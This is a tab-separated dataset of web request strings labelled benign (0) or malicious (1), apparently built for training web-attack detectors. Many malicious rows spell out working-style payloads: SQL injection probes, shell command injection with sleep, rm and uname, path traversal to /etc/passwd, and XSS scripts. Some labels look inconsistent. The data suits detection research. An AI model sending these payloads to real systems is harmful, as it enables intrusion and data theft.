request	label
/ 7fb8ba91dd9a4c6fd78acd9cbe0cfa17 / 	0
/ string / strings / parameters = 1 +  + union +  + select +  + abc +  + from +  + abc 	1
/ 210003 / 	0
/ string / strings / parameters = ; echo $ ifsncmfzs $  (  ( 89 + 41 )  )  $  ( echo $ ifsncmfzs ) ncmfzs \  \ 	1
/ string / strings / parameters = -4205 '  union all select 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 , 8986 # 	1
/ string / str =  $  ( echo rcspmw )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / modo = entrar & login = pittman & pwd = a73p3i4 & remember = off & b1 = entrar 	0
"/ help . php ? q =  "" ver & rem "	1
/ string / strings / parameters = 9e1an906 	0
/ string / strings / parameters = jandtegui curell 	0
"/ string / strings / parameters = < img style =  "" xss : expr /  * xss *  / ession ( confirm ( document . location )  )  ""  > "	1
"/ lmw4r201 . fts ?  < script > document . cookie =  "" testwews = 8477 ;  ""  <  / script > "	1
/ 037798 / 	0
/ bin / r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ firemoutheggs_tn / 	0
/ string / strings / parameters = ariel 	0
/ javascript / cookies . cs 	0
/ star_ball / 	0
/ javascript / shopping . shtml 	0
/ 2ffba4cde226b5 / 	0
/ o ' bryon / 	1
/ yt397e76ab3ff84441c088092cafddeaf5 / 	0
/ string / strings / parameters = 8320964749931174 	0
/ 67000000000 / 	0
"/ iv5vkgam . kspx ?  < meta http-equiv = set-cookie content =  "" testfosd = 94 ""  > "	1
/ string / modo = entrar & login = yansun & pwd =  ' embob , a- ' miento & remember = on & b1 = entrar 	1
/ javascript / ping . old 	0
/ string / strings / parameters = 7449583219109875 	0
"/ bzuf9ozq . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = edouard 	0
"/ help . php ? q =  ""  & del \ x09q44432678 \ x09 # "	1
/ drzadill / 	0
"/ string / strings / parameters = echo $ ifsauytpo $  (  ( 72 + 52 )  )  $  ( echo $ ifsauytpo ) auytpo "" "	1
/ string / strings / parameters = verema 4 	0
/ syrp1124 / 	0
/ for_sealholders / 	0
/ rbec2ohx . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 16610 	0
/ string / strings / parameters = tchjan-lian . quadflieg @ comerciosdeaspe . se 	0
/ string / modo = registro & login = zug & password = alternaci-59 & nombre = manel '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & apellidos = llimes & email = partridge @ tamarit . com . gs & dni = 23404560j & direccion = camino + uba ,  + 121 ,  +  & ciudad = arts & cp = 06892 & provincia = toledo & ntc = 5728967696273314 & b1 = registrar 	1
/ main . php ? logout =  '  ; uname \ x09 > q16263765 \ x09 # 	1
/ string / strings / parameters = castejon quiroga 	0
/ 126541523090430516013543916437004408741 / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 7513 = 7513 and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  -- "	1
/ string / id = 2 |  & nombre = jamn + ibrico & precio = 39 & cantidad = 25 & b1 = aadir + al + carrito 	1
/ 146455 / 	0
/ string / strings / parameters = 1 '  )  )  ; select pg_sleep ( 5 )  and  (  (  ' vxxg '  =  ' vxxg 	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 16 & b1 = aadir + al + carrito 	0
/  ~ bahsoonr / 	0
/ string / modo = registro & login = tamer & password = el * e0toral & nombre = floreal & apellidos = mio + odena & email = espinosa @ chicashumedas . net & dni = 81338514a & direccion = avenida + baraain ,  + 51 ,  + 1 ? h & ciudad = seplveda & cp = 22587 & provincia = tarragona & ntc = 7133903529620631 & b1 = registrar 	0
/ fuzzy_logic / 	0
/ string / strings / parameters = baretto0 @ drae2 . tk 	0
/ keyword_lawsuit / 	0
/ string / strings / parameters = veg * oso 	0
/ nat king cole / 	0
/ 1739115571 / 	0
"/ string / strings / parameters = 1 ""  ""  where 2309 = 2309 or elt ( 5873 = 5873 , sleep ( 5 )  )  # "	1
/ 027khz / 	0
/ string / strings / parameters = 1 '  )  as mgko where 1828 = 1828 and make_set ( 8403 = 8403 , 8899 )  -- 	1
/  .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ bravo3d / 	0
"/  ?  < script > document . cookie =  "" testmybc = 2088 ;  ""  <  / script > "	1
/ javascript / sponsor . exe 	1
"/ string / strings / parameters = '  |  | echo qsktxk $  (  ( 24 + 37 )  )  $  ( echo qsktxk ) qsktxk "" "	1
/ string / strings / parameters = 635l82rab74id35 	0
/ dance party mix / 	0
/ furnished / 	0
"/ string / strings / parameters = -6656 ""  ""  )  union all select 3931 # "	1
/ help . php ? q =  '  & rm q65268232  # 	1
/ ecposstat / 	0
/ string / modo = registro & login = kathlin & password =  + laur938 & nombre = jorda ? na & apellidos = pubill + tena & email = strasberg-gales @ videocasa-ebs . gi & dni = 75987637f & direccion = isla + de + salvora ,  + 65 + 1 ? c & ciudad = larraona & cp = 40542 & provincia = guipzcoa & ntc = 6860803220087599 & b1 = registrar 	1
"/ string / strings / parameters = 1 ""  ""  )  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  ""  "" pdsy ""  ""  like  ""  "" pdsy "	1
/ string / strings / parameters = navas de jorquera 	0
/ internetstore-space / 	0
/ string / strings / parameters = thum 	0
/ string / id = 2 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 68 & b1 = aadir + al + carrito 	1
/ javascript / link . conf 	0
"/ zmvq66jy . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 159274 / 	0
/ rectoverb / 	0
/ javascript / server-status . ini 	0
/ string / strings / parameters = grijota 	0
/ 50644042 / 	0
/ amateur-lesbian / 	0
/ 1320612382 / 	0
/ string / strings / parameters = 1 )  where 9645 = 9645 union all select null , null , null -- 	1
/ string / modo = entrar & login = kwok & pwd = a6lastam2en4o & remember = on & b1 = entrar 	0
/ 190551 / 	0
/ string / modo = registro & login = field & password = dis . cordante & nombre = gianfranco & apellidos = dausset + cartaya & email = patch @ francislucille . sm & dni = 88600786w & direccion = calle + o + outeiro ,  + 189 +  & ciudad = ojos + negros & cp = 05145 & provincia = jan & ntc =  ' or ' a =  ' a & b1 = registrar 	1
/ javascript / testimonials . dump 	0
/ raton3700 / 	0
/ string / strings / parameters = caamao alayo 	0
/ string / strings / parameters = & echo fwautf $  (  ( 39 + 22 )  )  $  ( echo fwautf ) fwautf & 	1
/ string / strings / parameters = hoek 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 /  & cantidad = 23 & b1 = aadir + al + carrito 	1
"/ string / strings / parameters = | echo mavzwg $  (  ( 0 + 81 )  )  $  ( echo mavzwg ) mavzwg "" "	1
/ cgis / view_item ? html_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / modo = entrar & login = morearty & pwd = 506tad09a & remember = off /  & b1 = entrar 	1
/ sain paint studio v10 / 	0
/ 160625 / 	0
/ string / modo = insertar & precio = 1635 & b1 = confirmar 	0
/ phpmyadmin / documentation . html ? phpmyadmin =  |  | cat  / etc / passwd 	1
/ javascript / standalone . class 	0
/ javascript / wsdl . pem 	0
/ string / strings / parameters = '  &  & echo vnscpp $  (  ( 62 + 21 )  )  $  ( echo vnscpp ) vnscpp & 	1
/ string / modo = entrar & login = sile & pwd = colmada43n24 & remember = off & b1 = entrar 	0
/ string / strings / parameters = 3740768702287666 	0
/ string / strings / parameters = -2483 '  where 1327 = 1327 union all select 1327 # 	1
/ modules / settings / headerfile . php ? system [ path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	0
/ string / strings / parameters = & echo $ ifsuvslmn $  (  ( 90 + 46 )  )  $  ( echo $ ifsuvslmn ) uvslmn | 	1
/ 000079182 / 	0
/ javascript / sendto . cfm 	0
/ 1137710 / 	0
/ logo-front / 	0
/ grunewald / 	0
/ confronting-terrorism / 	0
/ string / strings / parameters = 0887551084770656 	0
/ string / modo = registro & login = sadeghi & password = r4a8e3a & nombre = lujn & apellidos = gelde + pajares & email = dante @ opticaweb . mobi & dni = 51804577k & direccion = c /  + alfonso + de + armas + ayala + s / n ,  +  & ciudad = barbalos & cp = 22200 & provincia = alicante & ntc = 2781714156257998 & b1 = registrar 	0
/ christmas-carol / 	0
/ string / strings / parameters = scheifel2 	0
/ string / strings / parameters = 7907782578566170 	0
/ string / strings / parameters = barrutia marsany 	0
/ string / modo = entrar & login = lazlo & pwd = qunola & remember = on & b1 = entrar 	0
/ javascript / 2001 . exe 	1
/ 060906d / 	0
/ string / strings / parameters = 05115765j 	0
"/ string / str =  $  ( echo kqpsnd )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
"/ string / strings / parameters = -5529 ""  ""  or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  ) "	1
/ javascript / video . exe 	1
/ 128036 / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo zahuzd )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo usunjp )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | "	1
"/ top . php ? stuff =  "" rm \ x0bq81585151 & rem \ x0b "	1
/ javascript / main . cgi 	0
/ 150555 / 	0
"/ string / strings / parameters = ""  &  & echo msodxx $  (  ( 98 + 77 )  )  $  ( echo msodxx ) msodxx "	1
/ string / strings / parameters = eulalio 	0
/ javascript / input . htm 	0
"/ lmw4r201 . htm ?  < script > document . cookie =  "" testwews = 8477 ;  ""  <  / script > "	1
/ azulclaro3 / 	0
/ string / strings / parameters = cabrejas del pinar 	0
/ main . php ? logout =  '  & rm \ x09q59435268 \ x09 # 	1
/ javascript / menu . error 	0
/ string / strings / parameters = 35866862h 	0
/ kw_files / 	0
/ amercias most wanted jan 7th 2006 / 	0
/ string / strings / parameters = batallanos halpin 	0
/ string / strings / parameters = 6187378791844475 	0
/ 000108271 / 	0
/ thermokingreefer / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' pcps '  from dual where 7255 = 7255 and 7121 = 4603 	1
/ examples / jsp / num / snpfiltered . pl ? t = c & u =  < script > foo <  / script > 	1
/ gotnet / 	0
/ string / strings / parameters = 19294 	0
/ javascript / restricted . tpl 	0
/ phpmyadmin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904404 '  )  <  / script > 	1
/ string / strings / parameters = 1 '  )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null ) 	1
/ implsched / 	0
/ 20060922-4 / 	0
/ backupassist_v1 / 	0
/ 90x90_20061213104509 / 	0
"/ string / strings / parameters = 1 ""  ""  )  and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  ""  "" rvub ""  ""  like  ""  "" rvub "	1
"/ string / strings / parameters = < meta content =  ""  & newline ;  1  & newline ;  ;  javascript & colon ;  confirm ( 1 )  ""  http-equiv =  "" refresh ""  /  > "	1
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bfmcie )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ javascript / mailman . ppt 	0
/ phpmyadmin / wa . exe ? debug-show-version 	1
/ prinsendam / 	0
/ 20061005-8 / 	0
"/ string / strings / parameters = \  ""  )  )  or pg_sleep ( 50 )  -- "	1
"/ shopadmin . asp ? password = abc & username =  \  ""  >  < script > alert ( foo )  <  / script > "	1
/ string / strings / parameters = cerveruela 	0
/ 184425 / 	0
/ admin / cp . cfm 	0
"/ 9o6g5vkn . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ myspace_mygoditshotspace / 	0
/ mzmymda1 / 	0
/ 718242091 / 	0
/ 041853 / 	0
/ 146445 / 	0
/ resetpassword_en / 	0
/ linuxlinks / 	0
/ cfp-storagess2006 / 	0
/ javascript /  . passwd . rar 	1
/ forum9787 / 	0
/ about_nasaa / 	0
/ javascript / zorum . test 	0
/ string / strings / parameters = 1 '  )  where 1115 = 1115 ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  -- 	1
/ main . php ? logout =  '  \ x0arm q63177134  # 	1
/ string / strings / parameters = 1 '  ; if ( 7899 = 7899 )  select 7899 else drop function zbbp -- 	1
/ javascript / 6 . ppt 	0
/ javascript / xxx . trace 	0
/ o35zot2r . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo jweawe )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  & "	1
/ kash_1095 / 	0
/ string / strings / parameters = 1 '  +  ( select  ' mtpt '  where 7483 = 7483 union all select null , null , null , null , null , null , null , null , null -- 	1
/ jttaskap / 	0
/ cacti / ovlaunch . exe 	1
/ infectionurl-thumb / 	0
/ q41123388 	0
/ 200731 / 	0
"/ string / strings / parameters = ""  ""  ; alert ( 1 )  /  / "	1
"/ main . php ? logout =  ""  & rm \ x0cq99238383 & rem \ x0c "	1
/ examples / jsp / sessions / includes / config . php ? relative_script_path = http :  /  / xxxxxxx 	1
/ string / strings / parameters = 7694435206249147 	0
/ string / strings / parameters = 1 %  '  )  )  or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ string / modo = registro & login = dombrosk & password = velu ! dillo & nombre = quincio & apellidos = rezabal & email =  @ ga @ rvin @ caspospas . cl & dni = 77720635r & direccion = calle + arrozal + 110 ,  + 3 ? g & ciudad = artesa + de + segre & cp = 16336 & provincia = castelln & ntc = 4597794127827518 & b1 = registrar 	1
/ 147087 / 	0
/ spylax-6_small / 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo iobnnp )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' "	1
/ j2kdmfw4 . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ mab_cyber / 	0
"/ edzaia0i . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript . php ? abs_path =  / etc / passwd \ x00 	1
/ string / strings / parameters = -1 <  / title >  < script > document . cookie = true ;  <  / script > 	1
/ javascript / scheduling . tar 	0
/ string / strings / parameters = 1 )  as nwfz where 7365 = 7365 and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  -- 	1
/ blog132837_angelds / 	0
/ string / modo = entrar & login = lonnie & pwd = clivosa & remember = off & b1 = entrar 	0
/ faxserve / 	0
/ sad to be gay / 	0
/ internetrealestate / 	0
/ string / strings / parameters = santa cruz del comercio 	0
/ nebco_title / 	0
/ 000043835 / 	0
"/ string / strings / parameters = 1 ""  ""  where 1203 = 1203 union all select null , null , null -- "	1
/ string / strings / parameters = 1 '  in boolean mode )  or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ examples / jsp / jsp2 / jspx / index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ 092104creditscores / 	0
/ fo564rei . aspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = valdelagua del cerro 	0
"/ string / strings / parameters = & lt ; a href =  \  "" http &  # 58 ;  /  / www . google . com \  ""  & gt ; xss & lt ;  / a & gt ; "	1
/ article3099517 / 	0
/ string / strings / parameters = modugno @ wdsl . int 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jwnhuw )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ land of oz 2 / 	0
"/ n1afe1y6 . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 606wkcop . aspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ lavoro / 	0
"/ string / strings / parameters = |   [  6 -ne  $  ( echo lamxkc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ 11520000 / 	0
/ string / strings / parameters = mathurin 	0
/ string / strings / parameters = 1 '  +  ( select  ' vjoj '  where 5348 = 5348 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = 15129 	0
/ tk8065-class / 	0
/ javascript / address . xsl 	0
/ kobold / 	0
/ string / id = 1 & nombre = vino + rioja & precio = 39 & cantidad = 56 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = -2505 '  or 9323 = 9323 # 	1
/ string / str =  $  ( echo yqabcf )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ string / modo = registro & login = meier & password = c6nte9osa & nombre = nimia & apellidos = buisn + andres & email = oliveira_aptekman @ engibraltar . va & dni = 00660335m & direccion = inocencia + alayon ,  + s / n + 4-f & ciudad = san + bartolom + de + la + torre & cp = 12510 & provincia = valladolid & ntc = 3227728964471059 & b1 = registrar 	0
/ itpro-logo / 	0
/ 3141243_75 / 	0
/ star wars revenge of the sith script / 	1
/ gyachi / 	0
/ examples / jsp / checkbox / wa . exe ? debug-show-version 	1
/ cacti / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ javascript / cl . xml 	0
/ duckynemo / 	0
/ string / strings / parameters = 7855531412363120 	0
/ podcastgen1 . 0beta2 / core / admin / pgrssnews . php ? absoluteurl = xxpathxx 	1
/ koltovblack / 	0
"/ o1zj4u9v . pl ?  < meta http-equiv = set-cookie content =  "" testabrn = 6368 ""  > "	1
/ javascript / styles . save 	0
/ studie0105 / 	0
/ string / strings / parameters = c /  espigo ,  0 10h 	0
